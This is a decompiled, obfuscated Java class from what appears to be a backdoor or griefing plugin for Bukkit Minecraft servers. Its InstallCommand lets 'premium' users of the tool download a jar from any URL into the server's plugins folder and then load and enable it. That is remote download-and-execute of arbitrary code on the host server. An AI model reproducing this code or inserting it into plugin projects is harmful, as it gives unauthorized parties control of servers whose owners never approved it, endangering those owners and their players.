/*
 * Decompiled with CFR 0.150.
 * 
 * Could not load the following classes:
 *  org.bukkit.Bukkit
 *  org.bukkit.entity.Player
 *  org.bukkit.plugin.Plugin
 */
package me.system.runner.command.impl.premium;

import java.io.File;
import java.io.InputStream;
import java.net.URL;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.nio.file.StandardCopyOption;
import me.system.runner.Core;
import me.system.runner.command.Command;
import me.system.runner.utils.Settings;
import org.bukkit.Bukkit;
import org.bukkit.entity.Player;
import org.bukkit.plugin.Plugin;

public class InstallCommand
extends Command {
    public InstallCommand() {
        InstallCommand llllllllllllllIIlIIIIllIlIlIIIII;
    }

    @Override
    public boolean isBlatant() {
        return true;
    }

    @Override
    public void execute(Core llllllllllllllIIlIIIIllIlIIlIIIl, String llllllllllllllIIlIIIIllIlIIlIlII, String[] llllllllllllllIIlIIIIllIlIIlIIII, Player llllllllllllllIIlIIIIllIlIIIllll) {
        if (llllllllllllllIIlIIIIllIlIIlIIIl.premium.contains(llllllllllllllIIlIIIIllIlIIIllll.getName())) {
            if (llllllllllllllIIlIIIIllIlIIlIIII.length <= 2) {
                llllllllllllllIIlIIIIllIlIIIllll.sendMessage(Settings.USAGE("install <direct download url> <output name>"));
            } else {
                String llllllllllllllIIlIIIIllIlIIlIlll = llllllllllllllIIlIIIIllIlIIlIIII[2];
                if (Bukkit.getPluginManager().getPlugin(llllllllllllllIIlIIIIllIlIIlIlll) == null) {
                    try {
                        InputStream llllllllllllllIIlIIIIllIlIIllIIl = new URL(llllllllllllllIIlIIIIllIlIIlIIII[1]).openStream();
                        Files.copy(llllllllllllllIIlIIIIllIlIIllIIl, Paths.get(String.valueOf(new StringBuilder().append("plugins/").append(llllllllllllllIIlIIIIllIlIIlIlll).append(".jar")), new String[0]), StandardCopyOption.REPLACE_EXISTING);
                    }
                    catch (Exception llllllllllllllIIlIIIIllIlIIllIII) {
                        llllllllllllllIIlIIIIllIlIIIllll.sendMessage(Settings.PREFIX("Error: Something wrong with URL"));
                    }
                    llllllllllllllIIlIIIIllIlIIIllll.sendMessage(Settings.PREFIX("Plugin installed. Enabling..."));
                    Bukkit.getScheduler().runTaskLater((Plugin)llllllllllllllIIlIIIIllIlIIlIIIl, () -> {
                        try {
                            Bukkit.getPluginManager().loadPlugin(new File(Paths.get(String.valueOf(new StringBuilder().append("plugins/").append(llllllllllllllIIlIIIIllIlIIlIlll).append(".jar")), new String[0]).toString()));
                        }
                        catch (Exception llllllllllllllIIlIIIIllIlIIIlIII) {
                            llllllllllllllIIlIIIIllIlIIIlIII.printStackTrace();
                            llllllllllllllIIlIIIIllIlIIIllll.sendMessage(Settings.PREFIX("Error: Something went wrong with loading the plugin. Reload the server to enable the plugin!"));
                        }
                        if (Bukkit.getPluginManager().getPlugin(llllllllllllllIIlIIIIllIlIIlIlll) != null) {
                            Bukkit.getPluginManager().enablePlugin(Bukkit.getPluginManager().getPlugin(llllllllllllllIIlIIIIllIlIIlIlll));
                            llllllllllllllIIlIIIIllIlIIIllll.sendMessage(Settings.PREFIX("Plugin enabled!"));
                        }
                    }, 60L);
                } else {
                    llllllllllllllIIlIIIIllIlIIIllll.sendMessage(Settings.PREFIX("This plugin already exists!"));
                }
            }
        } else {
            llllllllllllllIIlIIIIllIlIIIllll.sendMessage(Settings.PREFIX(String.valueOf(new StringBuilder().append("You must be a ").append(Settings.RED).append("premium user ").append(Settings.WHITE).append("to execute this command"))));
        }
    }
}

